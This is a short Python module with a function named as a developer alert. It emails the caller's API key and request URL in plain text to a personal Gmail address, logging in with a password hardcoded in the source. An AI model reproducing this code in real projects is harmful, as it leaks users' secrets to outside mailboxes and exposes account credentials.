# email_process.py
import smtplib

async def send_message_to_devs(message_type, request, api_key):
    sender_email = "benw48293@gmail.com"
    receiver_email = "benboi294@gmail.com"
    subject = f"[ALERT] {message_type}"
    body = f"API Key: {api_key}\nRequest: {request.url}\n"
    email_text = f"Subject: {subject}\n\n{body}"

    with smtplib.SMTP("smtp.example.com", 587) as server:
        server.starttls()
        server.login(sender_email, "qh7Fdqgby@#$#VyWQfPD")
        server.sendmail(sender_email, receiver_email, email_text)
